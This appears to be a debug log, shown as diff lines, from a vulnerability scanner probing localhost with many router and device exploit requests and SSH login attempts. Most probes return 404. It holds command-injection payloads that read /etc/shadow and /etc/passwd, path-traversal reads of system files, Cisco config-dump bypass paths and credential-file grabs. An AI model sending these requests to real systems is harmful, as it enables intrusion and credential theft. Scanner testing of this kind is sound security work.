+2019-02-24 10:31:00,552 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,553 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/users.cgi?action=getUsers HTTP/1.1" 404 169
+2019-02-24 10:31:00,554 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,555 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/apply.cgi?ssid=%22%20%22%60cat%20/etc/shadow%60 HTTP/1.1" 404 169
+2019-02-24 10:31:00,557 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,557 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/rdfs.cgi HTTP/1.1" 404 169
+2019-02-24 10:31:00,559 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,560 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /../../../../../../../../../../../../etc/shadow HTTP/1.1" 400 173
+2019-02-24 10:31:00,606 DEBUG paramiko.transport       EOF in transport thread
+2019-02-24 10:31:57,487 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,490 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /apply.cgi HTTP/1.1" 404 169
+2019-02-24 10:31:57,491 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,493 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,494 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,495 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,496 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,498 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,500 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,502 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/authorize.asp HTTP/1.1" 404 169
+2019-02-24 10:31:57,504 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /tmUnblock.cgi HTTP/1.1" 404 169
+2019-02-24 10:31:57,505 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /.htpasswd HTTP/1.1" 404 169
+2019-02-24 10:31:57,505 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /HNAP1/ HTTP/1.1" 404 169
+2019-02-24 10:31:57,506 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /debug.cgi HTTP/1.1" 404 169
+2019-02-24 10:31:57,507 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,508 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET / HTTP/1.1" 200 612
+2019-02-24 10:31:57,509 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,511 DEBUG urllib3.connectionpool       Starting new HTTPS connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,511 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /UD/act?1 HTTP/1.1" 404 169
+2019-02-24 10:31:57,513 DEBUG urllib3.connectionpool       Starting new HTTPS connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,515 DEBUG paramiko.transport       starting thread (client mode): 0xb5b6cf28
+2019-02-24 10:31:57,517 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,518 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /js/Multi_Language.js HTTP/1.1" 404 169
+2019-02-24 10:31:57,521 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,521 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /globe HTTP/1.1" 404 169
+2019-02-24 10:31:57,522 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.4.2
+2019-02-24 10:31:57,523 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET / HTTP/1.1" 200 612
+2019-02-24 10:31:57,525 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,527 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_7.9
+2019-02-24 10:31:57,528 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,529 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_7.9)
+2019-02-24 10:31:57,530 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /logo.jpg HTTP/1.1" 404 169
+2019-02-24 10:31:57,532 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /goform/system/GatewaySettings.bin HTTP/1.1" 404 169
+2019-02-24 10:31:57,533 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /goform/system/GatewaySettings.bin HTTP/1.1" 404 169
+2019-02-24 10:31:57,535 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,537 DEBUG paramiko.transport       kex algos:['curve25519-sha256', 'curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group14-sha256', 'diffie-hellman-group14-sha1'] server key:['rsa-sha2-512', 'rsa-sha2-256', 'ssh-rsa', 'ecdsa-sha2-nistp256'] client encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] server encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] client mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] server mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] client compress:['none', 'zlib@openssh.com'] server compress:['none', 'zlib@openssh.com'] client lang:[''] server lang:[''] kex follows?False
+2019-02-24 10:31:57,538 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,539 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,540 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,542 DEBUG paramiko.transport       Kex agreed: ecdh-sha2-nistp256
+2019-02-24 10:31:57,543 DEBUG paramiko.transport       starting thread (client mode): 0xb430d470
+2019-02-24 10:31:57,544 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /html/password.html HTTP/1.1" 404 169
+2019-02-24 10:31:57,545 DEBUG paramiko.transport       HostKey agreed: ecdsa-sha2-nistp256
+2019-02-24 10:31:57,546 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.4.2
+2019-02-24 10:31:57,546 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2019-02-24 10:31:57,547 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,548 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /password.cgi HTTP/1.1" 404 169
+2019-02-24 10:31:57,548 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /UD/?5 HTTP/1.1" 404 169
+2019-02-24 10:31:57,548 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /api/wlan/security-settings HTTP/1.1" 404 169
+2019-02-24 10:31:57,548 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2019-02-24 10:31:57,549 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_7.9
+2019-02-24 10:31:57,551 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,551 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /error_page.htm HTTP/1.1" 404 169
+2019-02-24 10:31:57,554 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,558 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,558 DEBUG paramiko.transport       Compression agreed: none
+2019-02-24 10:31:57,558 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_7.9)
+2019-02-24 10:31:57,559 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /s_brief.htm HTTP/1.1" 404 169
+2019-02-24 10:31:57,561 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,562 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /SaveCfgFile.cgi HTTP/1.1" 404 169
+2019-02-24 10:31:57,562 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /imc/reportscript/sqlserver/deploypara.properties HTTP/1.1" 404 169
+2019-02-24 10:31:57,565 DEBUG urllib3.connectionpool       Starting new HTTPS connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,567 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,568 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /imc/report/DownloadReportSource?dirType=webapp&fileDir=reports&fileName=reportParaExample.xml..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini HTTP/1.1" 404 169
+2019-02-24 10:31:57,569 DEBUG paramiko.transport       kex algos:['curve25519-sha256', 'curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group14-sha256', 'diffie-hellman-group14-sha1'] server key:['rsa-sha2-512', 'rsa-sha2-256', 'ssh-rsa', 'ecdsa-sha2-nistp256'] client encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] server encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] client mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] server mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] client compress:['none', 'zlib@openssh.com'] server compress:['none', 'zlib@openssh.com'] client lang:[''] server lang:[''] kex follows?False
+2019-02-24 10:31:57,571 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,574 DEBUG urllib3.connectionpool       Starting new HTTPS connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,574 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /main/config.bin HTTP/1.1" 404 169
+2019-02-24 10:31:57,574 DEBUG paramiko.transport       Kex agreed: ecdh-sha2-nistp256
+2019-02-24 10:31:57,576 DEBUG paramiko.transport       HostKey agreed: ecdsa-sha2-nistp256
+2019-02-24 10:31:57,577 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2019-02-24 10:31:57,577 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2019-02-24 10:31:57,579 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,579 DEBUG paramiko.transport       Compression agreed: none
+2019-02-24 10:31:57,579 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /rpt/reportscript/sqlserver/deploypara.properties HTTP/1.1" 404 169
+2019-02-24 10:31:57,581 DEBUG urllib3.connectionpool       Starting new HTTPS connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,583 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /main/profile.wlp?PN=ggg HTTP/1.1" 404 169
+2019-02-24 10:31:57,585 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,586 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,590 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /main/event.logs HTTP/1.1" 404 169
+2019-02-24 10:31:57,590 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /imc/reportscript/oracle/deploypara.properties HTTP/1.1" 404 169
+2019-02-24 10:31:57,593 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,594 DEBUG paramiko.transport       kex engine KexNistp256 specified hash_algo <built-in function openssl_sha256>
+2019-02-24 10:31:57,596 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,598 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,599 DEBUG paramiko.transport       Switch to new keys ...
+2019-02-24 10:31:57,600 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 169
+2019-02-24 10:31:57,601 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "HEAD /rom-0 HTTP/1.1" 404 0
+2019-02-24 10:31:57,603 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,605 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,607 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,607 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /test HTTP/1.1" 404 571
+2019-02-24 10:31:57,608 DEBUG paramiko.transport       Adding ecdsa-sha2-nistp256 host key for 127.0.0.1: b'c72c9d3612bdad35a3308c53a18349fb'
+2019-02-24 10:31:57,611 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,612 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /login.stm HTTP/1.1" 404 169
+2019-02-24 10:31:57,612 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /diag.html?images/ HTTP/1.1" 404 169
+2019-02-24 10:31:57,615 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,615 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /SaveCfgFile.cgi HTTP/1.1" 404 169
+2019-02-24 10:31:57,616 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /rom-0 HTTP/1.1" 404 169
+2019-02-24 10:31:57,619 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,620 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /login.stm HTTP/1.1" 404 169
+2019-02-24 10:31:57,622 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,624 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,625 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /login.stm HTTP/1.1" 404 169
+2019-02-24 10:31:57,629 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,629 DEBUG paramiko.transport       kex engine KexNistp256 specified hash_algo <built-in function openssl_sha256>
+2019-02-24 10:31:57,630 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/webproc?getpage=/etc/passwd&var:page=deviceinfo HTTP/1.1" 404 169
+2019-02-24 10:31:57,630 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /login.cgi.php HTTP/1.1" 404 None
+2019-02-24 10:31:57,631 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /backupsettings.conf HTTP/1.1" 404 169
+2019-02-24 10:31:57,633 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,633 DEBUG paramiko.transport       Switch to new keys ...
+2019-02-24 10:31:57,635 DEBUG urllib3.connectionpool       Starting new HTTPS connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,637 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,638 DEBUG paramiko.transport       userauth is OK
+2019-02-24 10:31:57,639 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /login.cgi?logout=1 HTTP/1.1" 404 169
+2019-02-24 10:31:57,640 DEBUG paramiko.transport       Adding ecdsa-sha2-nistp256 host key for 127.0.0.1: b'c72c9d3612bdad35a3308c53a18349fb'
+2019-02-24 10:31:57,642 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,642 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/16/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,645 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,646 DEBUG paramiko.transport       Trying SSH key b'27c6adf9a64d223f18b03bdf811c5745'
+2019-02-24 10:31:57,647 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /filename.gwc HTTP/1.1" 404 169
+2019-02-24 10:31:57,648 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,649 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/17/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,649 INFO paramiko.transport       Authentication (password) failed.
+2019-02-24 10:31:57,652 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,652 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /ucsm/isSamInstalled.cgi HTTP/1.1" 404 169
+2019-02-24 10:31:57,653 DEBUG paramiko.transport       userauth is OK
+2019-02-24 10:31:57,655 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,656 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/18/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,657 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,658 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /ccmivr/IVRGetAudioFile.do?file=../../../../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 169
+2019-02-24 10:31:57,660 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,661 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/19/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,662 DEBUG paramiko.transport       Authentication type (keyboard-interactive) not permitted.
+2019-02-24 10:31:57,663 DEBUG paramiko.transport       Allowed methods: ['publickey', 'password']
+2019-02-24 10:31:57,664 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,665 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /goform/enhAuthHandler HTTP/1.1" 404 169
+2019-02-24 10:31:57,667 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,668 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,669 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/20/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,671 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,671 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET / HTTP/1.1" 200 612
+2019-02-24 10:31:57,672 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /password.cgi HTTP/1.1" 404 169
+2019-02-24 10:31:57,672 DEBUG paramiko.transport       userauth is OK
+2019-02-24 10:31:57,675 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,675 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/21/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,676 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,680 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,681 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/script?system%20cat%20/etc/passwd HTTP/1.1" 404 169
+2019-02-24 10:31:57,683 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/22/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,683 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /GatewaySettings.bin HTTP/1.1" 404 169
+2019-02-24 10:31:57,685 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,687 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/23/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,689 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,690 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/24/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,697 INFO paramiko.transport       Authentication (publickey) failed.
+2019-02-24 10:31:57,698 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,699 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/25/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,701 DEBUG paramiko.transport       starting thread (client mode): 0xb4335748
+2019-02-24 10:31:57,703 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,703 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.4.2
+2019-02-24 10:31:57,704 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/26/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,706 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,707 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/27/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,708 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_7.9
+2019-02-24 10:31:57,708 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_7.9)
+2019-02-24 10:31:57,709 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,710 DEBUG paramiko.transport       kex algos:['curve25519-sha256', 'curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group14-sha256', 'diffie-hellman-group14-sha1'] server key:['rsa-sha2-512', 'rsa-sha2-256', 'ssh-rsa', 'ecdsa-sha2-nistp256'] client encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] server encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] client mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] server mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] client compress:['none', 'zlib@openssh.com'] server compress:['none', 'zlib@openssh.com'] client lang:[''] server lang:[''] kex follows?False
+2019-02-24 10:31:57,710 DEBUG paramiko.transport       Kex agreed: ecdh-sha2-nistp256
+2019-02-24 10:31:57,711 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/28/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,711 DEBUG paramiko.transport       HostKey agreed: ecdsa-sha2-nistp256
+2019-02-24 10:31:57,712 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,713 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2019-02-24 10:31:57,714 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2019-02-24 10:31:57,715 DEBUG paramiko.transport       Compression agreed: none
+2019-02-24 10:31:57,715 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/29/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,728 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,730 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/30/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,731 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,733 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/31/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,734 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,742 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/32/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,743 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,745 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/33/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,749 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,750 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/34/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,753 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,756 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/35/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,758 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,763 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/36/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,765 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,769 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/37/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,771 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:57,771 DEBUG paramiko.transport       kex engine KexNistp256 specified hash_algo <built-in function openssl_sha256>
+2019-02-24 10:31:57,772 DEBUG paramiko.transport       Switch to new keys ...
+2019-02-24 10:31:57,772 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/38/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:31:57,776 DEBUG paramiko.transport       Adding ecdsa-sha2-nistp256 host key for 127.0.0.1: b'c72c9d3612bdad35a3308c53a18349fb'
